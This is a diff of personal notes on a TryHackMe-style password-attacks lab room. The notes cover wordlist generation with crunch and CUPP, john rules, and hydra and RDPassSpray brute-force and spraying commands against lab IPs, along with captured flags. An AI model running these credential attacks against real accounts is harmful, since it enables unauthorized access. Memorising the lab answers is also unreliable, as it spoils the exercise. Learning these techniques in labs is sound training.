@@ -8,7 +8,6 @@ This room introduces the fundamental techniques to perform a successful password
 
 This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss:
 
-
     Password profiling
     Password attacks techniques
     Online password attacks
@@ -28,7 +27,6 @@ Passwords are a protection method for accessing online accounts or computer syst
 To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the [Sony breach](https://www.techdirt.com/2014/12/05/shocking-sony-learned-no-password-lessons-after-2011-psn-hack/) in 2014. 
 
 Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks.
-
 
 Learn about password attacking techniques in the next task!
 *No answer needed*
@@ -52,7 +50,6 @@ Password cracking is considered one of the traditional techniques in pen-testing
     Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.
     Password cracking is a technique performed locally or on systems controlled by the attacker.
 
-
 Which type of password attack is performed locally?
 *Password cracking*
 
@@ -69,7 +66,6 @@ Here are some website lists that provide default passwords for various products.
     https://cirt.net/passwords
     https://default-password.info/
     https://datarecovery.com/rd/default-passwords/
-
 
 Weak Passwords
 Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists :
@@ -200,17 +196,12 @@ smithjohn
         
 ```
 
-![[Pasted image 20220910121328.png]]
-
 This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice!
-
 
 What is the Juniper Networks ISG 2000 default password?
 Check the following website: https://default-password.info/juniper/isg2000. Answer as username:password
 
 *netscreen:netscreen*
-
-![[Pasted image 20220910120247.png]]
 
 ###  Password Profiling #2 - Keyspace Technique and CUPP
 
@@ -254,7 +245,6 @@ crunch: 100% completed generating output
 
         
 
-
 ```
 
 Here is a snippet of the output:
@@ -292,7 +282,6 @@ dc
 dd
 
         
-
 
 ```
 
@@ -404,7 +393,6 @@ user@thm$  python3 cupp.py -i
               ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                             [ Mebus | https://github.com/Mebus/]
 
-
 [+] Insert the information about the victim to make a dictionary
 [+] If you don't know all the info, just hit enter when asked! ;)
 
@@ -413,20 +401,16 @@ user@thm$  python3 cupp.py -i
 > Nickname: 
 > Birthdate (DDMMYYYY): 
 
-
 > Partners) name:
 > Partners) nickname:
 > Partners) birthdate (DDMMYYYY):
-
 
 > Child's name:
 > Child's nickname:
 > Child's birthdate (DDMMYYYY):
 
-
 > Pet's name:
 > Company name:
-
 
 > Do you want to add some key words about the victim? Y/[N]:
 > Do you want to add special chars at the end of words? Y/[N]:
@@ -458,7 +442,6 @@ user@thm$  python3 cupp.py -l
               ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                             [ Mebus | https://github.com/Mebus/]
 
-
         Choose the section you want to download:
 
      1   Moby            14      french          27      places
@@ -474,7 +457,6 @@ user@thm$  python3 cupp.py -l
     11   dictionaries    24      names           37      yiddish
     12   dutch           25      net             38      exit program
     13   finnish         26      norwegian
-
 
         Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository
 
@@ -503,7 +485,6 @@ user@thm$  python3 cupp.py -a
            (__)    )\
               ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                             [ Mebus | https://github.com/Mebus/]
-
 
 [+] Checking if alectodb is not present...
 [+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...
@@ -685,7 +666,6 @@ Stopped: Mon Oct 11 10:54:08 2021
 
         
 ```
-
 
 Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type? (Use hashid or hash-identifer)
 
@@ -997,30 +977,10 @@ Try 'cut --help' for more information.
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3
 
-
-
-
 Rules:JumboSingle]
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 Rules:o1]
 Rules:o2]
-
-
-
 
 Rules:i1]
 Rules:i2]
@@ -1029,14 +989,6 @@ Rules:o1]
 Rules:i1]
 Rules:o2]
 Rules:i2]
-
-
-
-
-
-
-
-
 
 Rules:best64]
 Rules:d3ad0ne]
@@ -1045,8 +997,6 @@ Rules:InsidePro]
 Rules:T0XlC]
 Rules:rockyou-30000]
 Rules:specific]
-
-
 
 Rules:ShiftToggle]
 Rules:Split]
@@ -1070,30 +1020,10 @@ Rules:hashcat]
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2
 
-
-
-
 Rules:JumboSingle]
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 Rules:o1]
 Rules:o2]
-
-
-
 
 Rules:i1]
 Rules:i2]
@@ -1102,14 +1032,6 @@ Rules:o1]
 Rules:i1]
 Rules:o2]
 Rules:i2]
-
-
-
-
-
-
-
-
 
 Rules:best64]
 Rules:d3ad0ne]
@@ -1118,8 +1040,6 @@ Rules:InsidePro]
 Rules:T0XlC]
 Rules:rockyou-30000]
 Rules:specific]
-
-
 
 Rules:ShiftToggle]
 Rules:Split]
@@ -1148,30 +1068,10 @@ Try 'cut --help' for more information.
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2
 
-
-
-
 Rules:JumboSingle]
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 Rules:o1]
 Rules:o2]
-
-
-
 
 Rules:i1]
 Rules:i2]
@@ -1180,14 +1080,6 @@ Rules:o1]
 Rules:i1]
 Rules:o2]
 Rules:i2]
-
-
-
-
-
-
-
-
 
 Rules:best64]
 Rules:d3ad0ne]
@@ -1196,8 +1088,6 @@ Rules:InsidePro]
 Rules:T0XlC]
 Rules:rockyou-30000]
 Rules:specific]
-
-
 
 Rules:ShiftToggle]
 Rules:Split]
@@ -1221,30 +1111,10 @@ Rules:hashcat]
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2           
 
-
-
-
 JumboSingle]
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 o1]
 o2]
-
-
-
 
 i1]
 i2]
@@ -1253,14 +1123,6 @@ o1]
 i1]
 o2]
 i2]
-
-
-
-
-
-
-
-
 
 best64]
 d3ad0ne]
@@ -1269,8 +1131,6 @@ InsidePro]
 T0XlC]
 rockyou-30000]
 specific]
-
-
 
 ShiftToggle]
 Split]
@@ -1294,30 +1154,10 @@ hashcat]
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2| cut -d"]" -f1
 
-
-
-
 JumboSingle
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 o1
 o2
-
-
-
 
 i1
 i2
@@ -1326,14 +1166,6 @@ o1
 i1
 o2
 i2
-
-
-
-
-
-
-
-
 
 best64
 d3ad0ne
@@ -1342,8 +1174,6 @@ InsidePro
 T0XlC
 rockyou-30000
 specific
-
-
 
 ShiftToggle
 Split
@@ -1565,8 +1395,6 @@ $password9
 ```
 
 Now it's practice time to create your own rule.
-
-
 
 	What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 
 
@@ -1946,7 +1774,6 @@ Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds
 
 ```
 
-
 ```
 ┌──(kali㉿kali)-[/tmp]
 └─$ ftp 10.10.163.182
@@ -1991,7 +1818,6 @@ Can you guess the FTP credentials without brute-forcing? What is the flag?
 # that does not end with \n is properly loaded.
 [List.Rules:THM-Password-Attacks]
 Az"[0-9][0-9]" ^[!@]
-
 
 ```
 
@@ -2193,9 +2019,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:01:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:01:45
 
-
 ```
-
 
 In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.163.182:25 (SMTP).
 
@@ -2221,10 +2045,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:04:
 
 Perform a brute-forcing attack against the phillips account for the login page at http://10.10.163.182/login-get using hydra? What is the flag?
  use the clinic.lst dictionary to find the password
-
-![[Pasted image 20220910150631.png]]
-
-![[Pasted image 20220910150551.png]]
 
 *THM{33c5d4954da881814420f3ba39772644}*
 
@@ -2253,10 +2073,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:08:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:10:26
 
 ```
-
-![[Pasted image 20220910151136.png]]
-
-![[Pasted image 20220910151159.png]]
 
 *THM{f8e3750cc0ccbb863f2706a3b2933227}*
 
@@ -2301,7 +2117,6 @@ sammy
 
         
 
-
 ```
 
 Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.
@@ -2319,7 +2134,6 @@ user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
 
         
 
-
 ```
 
 Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
@@ -2327,7 +2141,6 @@ Note that L is to load the list of valid usernames, and -p uses the Spring2021 p
 RDP
 
 Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as RDPassSpray to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s Github repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:
-
 
 ```
 
@@ -2364,7 +2177,6 @@ optional arguments:
 
         
 
-
 ```
 
 Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.
@@ -2389,7 +2201,6 @@ user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-l
 
         
 
-
 ```
 
 There are various tools that perform a spraying password attack against different services, such as:
@@ -2401,16 +2212,11 @@ Tools:
     MailSniper
     https://github.com/dafthack/MailSniper
 
-
 SMB
 
     Tool: Metasploit (auxiliary/scanner/smb/smb_login)
 
-
-
-
 Use the following username list:
-
 
 ```
 Password spraying attack!
@@ -2476,14 +2282,12 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)
   IP address for br-mailcow:      172.22.1.1
   IP address for docker0:         172.17.0.1
 
-
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
 
 61 packages can be updated.
 8 updates are security updates.
-
 
 Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
 burgess@ip-10-10-163-182:~$ cat /etc/flag
@@ -2492,12 +2296,9 @@ burgess@ip-10-10-163-182:~$
 
 ```
 
-
 *THM{a97a26e86d09388bbea148f4b870277d}*
 
 ### Summary 
-
-
 
 This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including:
 
@@ -2505,7 +2306,6 @@ This room introduced the basic concepts of different password attacks and how to
     Password profiling
     Offline password attacks
     Online password attacks
-
 
 Hope you enjoyed the room and keep learning!
 
